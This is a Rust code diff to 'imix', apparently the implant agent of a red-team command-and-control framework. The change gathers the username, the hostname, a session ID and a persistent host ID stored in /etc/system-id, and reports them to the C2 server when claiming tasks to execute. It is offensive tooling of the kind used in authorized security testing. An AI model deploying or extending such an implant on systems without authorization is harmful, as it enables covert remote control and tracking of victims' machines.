@@ -1,6 +1,6 @@
-use std::collections::HashMap;
+use std::{collections::HashMap, fs};
 use std::fs::File;
-use std::io::BufReader;
+use std::io::{BufReader, Write};
 use std::path::Path;
 use std::time::Instant;
 use chrono::Utc;
@@ -10,6 +10,7 @@ use tokio::task;
 use tokio::time::Duration;
 use imix::graphql::{GraphQLTask, self};
 use eldritch::eldritch_run;
+use uuid::Uuid;
 
 async fn install(config_path: String) -> Result<(), imix::Error> {
     let config_file = File::open(config_path)?;
@@ -82,14 +83,98 @@ async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graph
     }
 }
 
+fn get_principal() -> Result<String> {
+    Ok(whoami::username())
+}
+
+fn get_hostname() -> Result<String> {
+    Ok(whoami::hostname())
+}
+
+fn get_session_id() -> Result<String> {
+    let session_id = Uuid::new_v4();
+    Ok(session_id.to_string())
+}
+
+fn get_host_id(host_id_file_path: String) -> Result<String> {
+    let mut host_id = Uuid::new_v4().to_string();
+    let host_id_file = Path::new(&host_id_file_path);
+    if host_id_file.exists() {
+        host_id = match fs::read_to_string(host_id_file) {
+            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
+            Err(_) => host_id,
+        };
+    } else {
+        let mut host_id_file_obj = match File::create(host_id_file) {
+            Ok(tmp_file_obj) => tmp_file_obj,
+            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
+        };
+        match host_id_file_obj.write_all(host_id.as_bytes()) {
+            Ok(_) => {}, // Don't care if write fails or not going to to send our generated one.
+            Err(_) => {},
+        }
+    }
+    Ok(host_id)
+}
+
+
 // Async handler for port scanning.
 async fn main_loop(config_path: String) -> Result<()> {
     let debug = true;
+    let version_string = "v0.1.0";
     let config_file = File::open(config_path)?;
     let reader = BufReader::new(config_file);
     let imix_config: imix::Config = serde_json::from_reader(reader)?;
 
     let mut all_exec_futures: HashMap<String, _> = HashMap::new();
+
+    let principal = match get_principal() {
+        Ok(username) => username,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get process username"));
+            }
+            "UNKNOWN".to_string()
+        },
+    };
+
+    let hostname = match get_hostname() {
+        Ok(tmp_hostname) => tmp_hostname,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get system hostname"));
+            }
+            "UNKNOWN".to_string()
+        },
+    };
+
+    let session_id = match get_session_id() {
+        Ok(tmp_session_id) => tmp_session_id,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get a random session id"));
+            }
+            "DANGER-UNKNOWN".to_string()
+        },
+    };
+
+    let host_id = match get_host_id("/etc/system-id".to_string()) {
+        Ok(tmp_host_id) => tmp_host_id,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get or create a host id"));
+            }
+            "DANGER-UNKNOWN".to_string()
+        },
+    };
+
+    let claim_tasks_input = graphql::GraphQLClaimTasksInput {
+        principal: principal,
+        hostname: hostname,
+        session_identifier: session_id,
+        host_identifier: host_id,
+        agent_identifier: format!("{}-{}","imix",version_string),
+    };
 
     loop {
         // 0. Get loop start time
@@ -100,7 +185,7 @@ async fn main_loop(config_path: String) -> Result<()> {
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
 
         // 1b) Collect new tasks
-        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone()).await {
+        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone(), claim_tasks_input).await {
             Ok(tasks) => tasks,
             Err(error) => {
                 if debug {
